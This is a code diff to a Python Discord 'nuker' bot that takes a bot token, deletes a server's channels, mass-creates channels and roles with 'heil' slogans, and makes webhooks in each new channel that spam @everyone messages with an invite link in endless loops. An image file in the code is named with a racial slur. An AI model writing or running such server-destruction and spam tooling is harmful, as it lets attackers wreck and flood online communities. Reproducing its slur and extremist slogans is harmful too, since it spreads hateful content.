@@ -1,6 +1,6 @@
 import asyncio
 import aiohttp
-import numpy as np
+import random
 import discord.ext
 import requests as rq_
 from colorama import Fore
@@ -12,6 +12,14 @@ TOKEN = input("Token:")
 headers = {'Authorization': f'Bot {TOKEN}'}
 chNames = ['heil hmg', 'heil hmg', 'heil hmg', 'heil hmg']
 rNames = ['Nuked By Jak | Heil the Guard', 'Nuked By Jak | Heil the Guard']
+SPAM = ["""
+```Nuked By His Majesty's Guard```
+
+__**HEIL THE GUARD**__
+https://media.discordapp.net/attachments/1091794018301661355/1091794133120720966/Untitled296_20221128195950.png
+https://discord.gg/rdXHweYQ7f
+||@everyone||
+"""]
 rq = rq_.Session()
 
 with open("nigger.png", "rb") as image:
@@ -32,7 +40,7 @@ async def deleteChannel(channel, session):
 
 
 async def createChannel(guild, session):
-    json = {"name": np.random.choice(chNames)}
+    json = {"name": random.choice(chNames)}
     while True:
         async with session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers,
                                 json=json) as channelCre:
@@ -44,7 +52,7 @@ async def createChannel(guild, session):
 
 
 async def createRole(guild, session):
-    json = {"name": np.random.choice(rNames), "color": "0x4a412a"}
+    json = {"name": random.choice(rNames), "color": "0x4a412a"}
     while True:
         async with session.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers,
                                 json=json) as roleCre:
@@ -74,9 +82,9 @@ async def on_ready():
 
 @Sachs.event
 async def on_guild_channel_create(channel):
-    webhook = await channel.create_webhook(name="SUFFERING")
+    webhook = await channel.create_webhook(name="HEIL THE GUARD")
     while True:
-        await webhook.send(f"@everyone This server has been reduced to atoms by the SACHS")
+        await webhook.send(SPAM)
 
 
 ### Bot Commands ###
